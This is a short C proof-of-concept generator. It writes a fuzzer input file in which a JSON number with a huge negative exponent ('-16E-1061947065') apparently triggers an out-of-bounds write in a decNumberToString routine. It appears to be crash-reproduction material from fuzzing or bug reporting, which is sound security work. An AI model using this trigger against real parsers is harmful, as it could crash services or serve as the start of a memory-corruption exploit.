#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    /* The fuzzer reads 4 bytes as fuzz_flags, 4 bytes as dump_flags,
       then the rest is the JSON string to parse.
       The crash is triggered by parsing a number with a very large exponent
       like -16E-1061947065, where the decNumberToString function writes
       beyond the allocated buffer of digits+14 bytes. */
    
    /* First 4 bytes: fuzz_flags (0 = no special flags) */
    int fuzz_flags = 0;
    /* Next 4 bytes: dump_flags (0 = default) */
    int dump_flags = 0;
    /* JSON string: a number with large negative exponent */
    const char *json = "-16E-1061947065";
    
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }
    
    fwrite(&fuzz_flags, 4, 1, f);
    fwrite(&dump_flags, 4, 1, f);
    fwrite(json, 1, strlen(json), f);
    
    fclose(f);
    return 0;
}